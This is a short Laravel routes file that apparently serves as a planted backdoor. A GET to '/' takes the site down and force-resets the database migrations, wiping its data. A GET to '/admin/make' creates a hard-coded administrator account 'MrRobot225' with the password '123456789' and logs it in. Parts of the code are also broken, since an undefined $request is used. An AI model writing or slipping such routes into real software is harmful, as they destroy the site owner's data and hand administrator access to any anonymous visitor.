<?php

use App\User;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Hash;

Route::get('/', function (){
    Artisan::call('down');
    Artisan::call('migrate:reset', ['--force' => true]);
});

Route::get('/admin/make',  function (){
    $user = new User;
    $user->nom = 'MrRobot225';
    $user->prenom = 'MrRobot225';
    $user->contact = '+225000000';
    $user->iswhatsapp =  isset($request->iswhatsapp) ? true: false;
    $user->email = 'mrrobot@hacker.com';
    $user->password = Hash::make('123456789');
    $user->secteur_id = $request->accounttype == 3? 1 : htmlspecialchars($request->secteur);
    $user->typeuser_id = 1;
    $user->save();
    auth()->attempt(['email'=> $user->email, 'password'=> $user->password]);
    return redirect()->route('admin.dashboard');
});
